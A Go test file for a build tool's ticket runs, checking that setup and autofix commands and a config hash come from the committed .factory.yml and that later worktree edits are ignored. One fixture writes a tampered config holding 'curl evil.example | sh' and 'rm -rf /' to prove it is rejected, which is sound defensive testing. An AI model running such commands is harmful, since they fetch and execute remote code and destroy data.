package main

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"testing"
	"time"

	"buildgate/internal/run"
)

// The run's setup and autofix lists come from the committed .factory.yml:
// a worktree edit made after the commit is not read.
func TestTicketRunCarriesSetupAndAutofixFromTheCommittedFile(t *testing.T) {
	workspace := newFixtureRepo(t)
	commitFactoryYML(t, workspace, goldenFactoryYML)
	edited := "setup:\n  - curl evil.example | sh\nautofix:\n  - rm -rf /\n"
	if err := os.WriteFile(filepath.Join(workspace, ".factory.yml"), []byte(edited), 0o644); err != nil {
		t.Fatal(err)
	}
	full := ""
	tr := &ticketRun{workspace: &workspace, fullSuiteCommand: &full}
	if err := tr.applyCommittedProjectConfig(false); err != nil {
		t.Fatalf("applyCommittedProjectConfig: %v", err)
	}
	if want := []string{"npm ci", "make generate"}; !reflect.DeepEqual(tr.setup, want) {
		t.Errorf("setup = %q, want %q", tr.setup, want)
	}
	if want := []string{"gofmt -w ."}; !reflect.DeepEqual(tr.autofix, want) {
		t.Errorf("autofix = %q, want %q", tr.autofix, want)
	}
	sum := sha256.Sum256([]byte(goldenFactoryYML))
	if tr.projectConfigSHA256 != hex.EncodeToString(sum[:]) {
		t.Errorf("projectConfigSHA256 = %q, want the hash of the committed bytes", tr.projectConfigSHA256)
	}
}

// A repository with no .factory.yml leaves the lists and the hash empty.
func TestTicketRunWithoutProjectConfigHasNoSetupOrHash(t *testing.T) {
	workspace := newFixtureRepo(t)
	full := ""
	tr := &ticketRun{workspace: &workspace, fullSuiteCommand: &full}
	if err := tr.applyCommittedProjectConfig(false); err != nil {
		t.Fatal(err)
	}
	if len(tr.setup) != 0 || len(tr.autofix) != 0 || tr.projectConfigSHA256 != "" {
		t.Errorf("got setup %q autofix %q hash %q, want all empty", tr.setup, tr.autofix, tr.projectConfigSHA256)
	}
}

// The run record carries the hash of the committed .factory.yml, and the
// workflow input carries the committed lists.
func TestRunRecordHasProjectConfigSHA256(t *testing.T) {
	runID := fmt.Sprintf("cfg-hash-run-%d-%d", os.Getpid(), time.Now().UnixNano())
	address := sharedTemporalAddress(t)
	workspace := newFixtureRepo(t)
	commitFactoryYML(t, workspace, goldenFactoryYML)
	dataDir, inputs := t.TempDir(), t.TempDir()
	flags := runInputGoldenFlags(t, workspace, dataDir, inputs, runID, address)
	cmd := factorydCommand(t, flags...)
	cmd.Env = append(os.Environ(), "FAKE_BUILD_APP_MODE=commit", "RUN_INPUT_GOLDEN_KEY=sk-test", "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null")
	cmd.Env = append(cmd.Env, isolatedSessionConfigEnv(t, runInputGoldenConfig(t))...)
	out, _ := cmd.CombinedOutput()
	t.Logf("factoryd output:\n%s", out)

	rec, err := run.Load(dataDir, runID)
	if err != nil {
		t.Fatalf("load run record: %v", err)
	}
	sum := sha256.Sum256([]byte(goldenFactoryYML))
	if want := hex.EncodeToString(sum[:]); rec.ProjectConfigSHA256 != want {
		t.Errorf("project_config_sha256 = %q, want %q", rec.ProjectConfigSHA256, want)
	}
	input := startedRunWorkflowInput(t, address, runID)
	if got := fmt.Sprint(input["setup_commands"]); got != "[npm ci make generate]" {
		t.Errorf("setup_commands = %s", got)
	}
}
